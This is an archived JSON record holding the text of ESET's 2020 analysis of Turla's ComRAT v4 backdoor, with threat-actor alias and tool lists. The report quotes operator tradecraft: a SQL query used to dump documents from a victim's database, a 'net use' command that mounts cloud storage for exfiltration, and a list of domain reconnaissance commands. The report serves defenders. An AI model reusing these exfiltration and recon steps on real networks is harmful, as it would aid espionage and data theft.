{
    "id": "b05c162b-a3f9-410f-b0b1-876ccafc67ca",
    "created_at": "2023-01-12T14:58:50.163058Z",
    "updated_at": "2025-03-27T02:16:20.945919Z",
    "deleted_at": null,
    "sha1_hash": "b2fdad7634ec29926964734e1586cd1f803f5504",
    "title": "2020-05-26 - From Agent.BTZ to ComRAT v4- A ten‑year journey",
    "authors": "",
    "file_creation_date": "2022-05-28T00:37:05Z",
    "file_modification_date": "2022-05-28T00:37:05Z",
    "file_size": 316787,
    "plain_text": "# From Agent.BTZ to ComRAT v4: A ten‑year journey\n\n**welivesecurity.com/2020/05/26/agentbtz-comratv4-ten-year-journey/**\n\nMay 26, 2020\n\nTurla has updated its ComRAT backdoor and now uses the Gmail web interface for Command and Control\n\n[Matthieu Faou](https://www.welivesecurity.com/author/mfaou/)\n26 May 2020 - 11:30AM\n\nTurla has updated its ComRAT backdoor and now uses the Gmail web interface for Command and Control\n\nESET researchers have found a new version of one of the oldest malware families run by the Turla group,\nComRAT. Turla, also known as Snake, is an infamous espionage group that has been active for more than ten\n[years. We have previously described many campaigns attributed to this group.](https://www.welivesecurity.com/?s=turla)\n\n\n-----\n\n[ComRAT, also known as Agent.BTZ and to its developers as Chinch, is a Remote Access Trojan (RAT) that](https://www.gdatasoftware.com/blog/2014/11/23937-the-uroburos-case-new-sophisticated-rat-identified)\n[became infamous after its use in a breach of the US military in 2008. The first version of this malware, likely](https://www.nytimes.com/2010/08/26/technology/26cyber.html)\nreleased in 2007, exhibited worm capabilities by spreading through removable drives. From 2007 to 2012, two\nnew major versions of the RAT were released. Interestingly, both employed the well-known Turla XOR key:\n\n_1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s_\n\nUntil mid-2017, the Turla developers made a few changes to ComRAT, but these variants were apparently still\nderived from the same code base.\n\n[From Agent.BTZ to ComRAT v4: A ten‑year journey](https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf)\n\n[Download Research Paper](https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf)\n\nThen, in 2017, we noticed that a very different version of ComRAT had been released. This new version used a\ncompletely new code base and was far more complex than its predecessors. Here are the main characteristics of\nthis malware family:\n\nComRAT v4 was first seen in 2017 and known still to be in use as recently as January 2020.\nWe identified at least three targets: two Ministries of Foreign Affairs and a national parliament.\nComRAT was used to exfiltrate sensitive documents. The operators used public cloud services such as\nOneDrive and 4shared to exfiltrate data.\nComRAT is a complex backdoor developed in C++.\nComRAT uses a Virtual FAT16 File System.\nComRAT is deployed using existing access methods, such as the PowerStallion PowerShell backdoor.\nComRAT has two Command and Control channels\n\nHTTP: It uses exactly the same protocol as ComRAT v3\nEmail: It uses the Gmail web interface to receive commands and exfiltrate data\nComRAT can perform many actions on the compromised computers, such as executing additional\nprograms or exfiltrating files.\n\n## Attribution to Turla\n\nBased on the victimology and the TTPs, we believe that ComRAT is used exclusively by Turla. There are a few\nelements linking ComRAT v4 to Turla:\n\nIt uses the same internal name, Chinch, as the previous versions\nIt uses the same custom C&C protocol over HTTP as ComRAT v3\nA part of the network infrastructure is shared with another Turla malware family, [Mosquito](https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf)\n[It was dropped by, or has dropped other, Turla malware families:](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/)\n\nA customized PowerShell loader\nThe PowerStallion backdoor\nThe RPC backdoor\n\n## Insight into attacker’s activity\n\nDuring our investigation, we were able to gain insights about what Turla operators were doing on the\ncompromised machines.\n\n\n-----\n\nThe main use of ComRAT is stealing confidential documents. In one case, its operators even deployed a .NET\nexecutable to interact with the victim’s central MS SQL Server database containing the organization’s\ndocuments. Figure 1 is the redacted SQL command.\n\n\n1\n\n2\n\n3\n\n\nsqlCommand.CommandText = \"select top \" + num2.ToString() + \" filename, img, datalength(img), id from\n<Redacted> with(nolock) where not img is null and id>\" + num4.ToString();\n\nsqlCommand.CommandText += \" and datalength(img)<1500000 and (filename like '%.doc' or filename like\n'%.docx' or filename like '[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%.pdf' or (filename like '3%.pdf' and\nlen(filename)>9))\";\n\nsqlCommand.CommandText += \" order by id\";\n\n\n_Figure 1. SQL command to dump documents from the central database (partially redacted)_\n\nThese documents were then compressed and exfiltrated to a cloud storage provider such as OneDrive or\n4shared. Cloud storage is mounted using the net use command as shown in Figure 2.\n\n\n1\n\n2\n\n3\n\n\ntracert -h 10 yahoo.com\n\nnet use https://docs.live.net/E65<redacted> <redacted password> /u:<redacted>@aol.co.uk\n\ntracert -h 10 yahoo.com\n\n\n_Figure 2. Command to mount a OneDrive folder using net use (partially redacted)_\n\nIn addition to document stealing, the operators also run many commands to gather information about the Active\nDirectory groups or users, the network, or Microsoft Windows configurations such as the group policies. Figure 3\nis a list of commands executed by Turla operators.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n\ngpresult /z\n\ngpresult /v\n\ngpresult\n\nnet view\n\nnet view /domain\n\nnetstat\n\nnetstat -nab\n\nnetstat -nao\n\nnslookup 127.0.0.1\n\nipconfig /all\n\narp -a\n\nnet share\n\nnet use\n\nsysteminfo\n\nnet user\n\nnet user administrator\n\nnet user /domain\n\nnet group\n\nnet group /domain\n\nnet localgroup\n\nnet localgroup\n\nnet localgroup Administrators\n\nnet group \"Domain Computers\" /domain\n\nnet group \"Domain Admins\" /domain\n\nnet group \"Domain Controllers\" /domain\n\ndir \"%programfiles%\"\n\nnet group \"Exchange Servers\" /domain\n\nnet accounts\n\nnet accounts /domain\n\nnet view 127.0.0.1 /all\n\nnet session\n\nroute print\n\nipconfig /displaydns\n\n\n-----\n\n_Figure 3. Basic recon of the compromised machine_\n\nFinally, we also noticed that Turla operators are aware of and try to evade security software. For instance, they\nregularly exfiltrate security-related log files in order to understand whether their malware samples have been\ndetected. This shows the level of sophistication of this group and its intention to stay on the same machines for a\nlong time.\n\n## Technical analysis\n\nAccording to its compilation timestamp, which is likely genuine, the first known sample of ComRAT v4 was\ncompiled in April 2017. The most recent iteration of the backdoor we’ve seen was, to the best of our knowledge,\ncompiled in November 2019.\n\nBased on ESET telemetry, we believe that ComRAT is installed using an existing foothold such as compromised\n[credentials or via another Turla backdoor. For instance, we’ve seen ComRAT installed by PowerStallion, their](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/)\nPowerShell-based backdoor we described in 2019.\n\nThe ComRAT installer is a PowerShell script that creates a Windows scheduled task and fills a Registry value\nwith the encrypted payload.\n\nComRAT v4 has several components:\n\nan orchestrator, injected into explorer.exe. It controls most of ComRAT functions including the execution of\nbackdoor commands.\na communication module (a DLL), injected into the default browser by the orchestrator. It communicates\nwith the orchestrator using a named pipe.\na Virtual FAT16 File System, containing the configuration and the logs files.\n\nFigure 4 is an overview of ComRAT’s architecture.\n\n\n-----\n\n_Figure 4. Summary of ComRAT architecture_\n\nComRAT v4 has two different C&C channels: HTTP (known internally as legacy), which (surprise surprise) uses\nthe HTTP protocol, and email (known internally as mail), which uses the Gmail web interface.\n\nIn the latter mode and using cookies stored in the configuration, it connects to the Gmail web interface in order to\ncheck the inbox and download specific mail attachments that contain encrypted commands. These commands\nare sent by the malware operators from another address, generally hosted on a different free email provider such\nas GMX.\n\n_[A detailed technical analysis of all ComRAT’s components is available in the white paper.](https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf)_\n\n## Conclusion\n\n\n-----\n\nComRAT v4 is a totally revamped malware family released in 2017. Its developers took inspiration from other\nTurla backdoors, such as Snake, to build a very complex piece of malware.\n\nIts most interesting feature is the use of the Gmail web UI to receive commands and exfiltrate data. Thus, it is\nable to bypass some security controls because it doesn’t rely on any malicious domain. We also noticed that this\nnew version abandoned the use of COM object hijacking for persistence, the method that gave the malware its\ncommon name.\n\nWe found indications that ComRAT v4 was still in use at the beginning of 2020, showing that the Turla group is\nstill very active and a major threat for diplomats and militaries.\n\nA full and comprehensive list of Indicators of Compromise (IoCs) and samples can be found in the full white\n[paper and in our GitHub repository.](https://github.com/eset/malware-ioc/tree/master/turla#turla-comrat-v4-indicators-of-compromise)\n\nFor a detailed analysis of the backdoor, refer to our white paper. For any inquiries, or to make sample\n_submissions related to the subject, contact us at threatintel@eset.com._\n\n## MITRE ATT&CK techniques\n\n**Tactic** **Id** **Name** **Description**\n\nExecution [T1086](https://attack.mitre.org/techniques/T1086/) PowerShell A PowerShell\nscript is used\nto install\nComRAT.\n\nPersistence [T1053](https://attack.mitre.org/techniques/T1053/) Scheduled Task ComRAT\nuses a\nscheduled\ntask to launch\nits\nPowerShell\nloader.\n\n\nDefense\nEvasion\n\n\n[T1027](https://attack.mitre.org/techniques/T1027/) Obfuscated Files or Information The ComRAT\norchestrator\nis stored\nencrypted\nand only\ndecrypted\nupon\nexecution.\n\n\n[T1055](https://attack.mitre.org/techniques/T1055/) Process\nInjection\n\n[T1112](https://attack.mitre.org/techniques/T1112/) Modify\nRegistry\n\n\nThe ComRAT orchestrator is injected into explorer.exe . The\ncommunication DLL is injected into the default browser.\n\nThe ComRAT orchestrator is stored encrypted in the Registry.\n\n\nDiscovery [T1016](https://attack.mitre.org/techniques/T1016/) System Network Configuration Discovery Operators\nexecute\nipconfig and\nnbstat .\n\n\n[T1033](https://attack.mitre.org/techniques/T1033/) System\nOwner/User\nDiscovery\n\n\nOperators execute net user .\n\n\n-----\n\n**Tactic** **Id** **Name** **Description**\n\n\n[T1069](https://attack.mitre.org/techniques/T1069/) Permission\nGroups\nDiscovery\n\n[T1082](https://attack.mitre.org/techniques/T1082/) System\nInformation\nDiscovery\n\n[T1083](https://attack.mitre.org/techniques/T1083/) File and\nDirectory\nDiscovery\n\n[T1087](https://attack.mitre.org/techniques/T1087/) Account\nDiscovery\n\n[T1120](https://attack.mitre.org/techniques/T1120/) Peripheral\nDevice\nDiscovery\n\n[T1135](https://attack.mitre.org/techniques/T1135/) Network\nShare\nDiscovery\n\n\nOperators execute net group /domain .\n\nOperators execute systeminfo .\n\nOperators list the content of several directories. Example: dir /ogd\n\"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\"\n.\n\nOperators execute net user and net group .\n\nOperators execute fsutil fsinfo drives to list the connected drives.\n\nOperators execute net view .\n\n\nCollection [T1213](https://attack.mitre.org/techniques/T1213/) Data from Information Repositories The\nOperators\nuse a custom\ntool to\nexfiltrate\ndocuments\nfrom an\ninternal\ncentral\ndatabase.\n\n\nCommand\nand Control\n\n\n[T1024](https://attack.mitre.org/techniques/T1024/) Custom Cryptographic Protocol ComRAT\nuses RSA\nand AES to\nencrypt C&C\ndata.\n\n\n[T1043](https://attack.mitre.org/techniques/T1043/) Commonly\nUsed Port\n\n[T1071](https://attack.mitre.org/techniques/T1071/) Standard\nApplication\nLayer\nProtocol\n\n[T1102](https://attack.mitre.org/techniques/T1102/) Web\nService\n\n\nComRAT uses ports 80 and 443.\n\nComRAT uses HTTP and HTTPS.\n\nComRAT can be controlled via the Gmail web UI.\n\n\nExfiltration [T1002](https://attack.mitre.org/techniques/T1002/) Data Compressed The\ndocuments\nare\ncompressed\nin a RAR\narchive.\n\n\n[T1022](https://attack.mitre.org/techniques/T1022/) Data\nEncrypted\n\n\nThe RAR archive is encrypted with a password.\n\n\n-----\n\n**Tactic** **Id** **Name** **Description**\n\n\n[T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration\nOver\nAlternative\nProtocol\n\n26 May 2020 - 11:30AM\n\n\nData is exfiltrated to cloud storage, mounted locally using the net\nuse command.\n\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-26 - From Agent.BTZ to ComRAT v4- A ten‑year journey.pdf"
    ],
    "report_names": [
        "2020-05-26 - From Agent.BTZ to ComRAT v4- A ten‑year journey.pdf"
    ],
    "threat_actors": [
        {
            "id": "9ff60d4d-153b-4ed5-a2f7-18a21d2fa05d",
            "created_at": "2022-10-25T16:07:23.539852Z",
            "updated_at": "2025-03-27T02:02:09.853285Z",
            "deleted_at": null,
            "main_name": "Desert Falcons",
            "aliases": [
                "APT-C-23",
                "ATK 66",
                "Arid Viper",
                "Operation Arid Viper",
                "Operation Bearded Barbie",
                "Operation Rebound",
                "TAG-63",
                "TAG-CT1",
                "Two-tailed Scorpion"
            ],
            "source_name": "ETDA:Desert Falcons",
            "tools": [
                "AridSpy",
                "Barb(ie) Downloader",
                "BarbWire",
                "Desert Scorpion",
                "FrozenCell",
                "GlanceLove",
                "GnatSpy",
                "KasperAgent",
                "Micropsia",
                "PyMICROPSIA",
                "SpyC23",
                "Viper RAT",
                "ViperRAT",
                "VolatileVenom",
                "WinkChat",
                "android.micropsia"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535530,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1653698225,
    "ts_modification_date": 1653698225,
    "files": {
        "pdf": "https://archive.orkl.eu/b2fdad7634ec29926964734e1586cd1f803f5504.pdf",
        "text": "https://archive.orkl.eu/b2fdad7634ec29926964734e1586cd1f803f5504.txt",
        "img": "https://archive.orkl.eu/b2fdad7634ec29926964734e1586cd1f803f5504.jpg"
    }
}